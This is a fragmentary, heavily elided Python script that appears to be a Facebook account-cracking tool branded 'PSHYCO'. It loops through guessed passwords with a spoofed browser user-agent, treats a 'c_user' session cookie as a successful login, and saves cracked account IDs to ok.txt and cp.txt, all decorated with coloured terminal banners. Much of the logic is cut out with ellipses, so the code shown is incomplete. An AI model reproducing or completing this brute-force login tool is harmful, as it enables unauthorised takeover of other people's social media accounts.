...
\033[1;32m║\033[0;32m          𝐕𝐀𝐑𝐒𝐈𝐎𝐍        ➣ 2.0.0                            \033[1;32m║
...
def news():
    ...
    print(' \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m Ids saved in Q-PSHYCO/ok.txt,Q-PSHYCO/cp.txt')
    print(' \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
        ...
        for ps in pwx:
          ...
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mPSHYCO\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
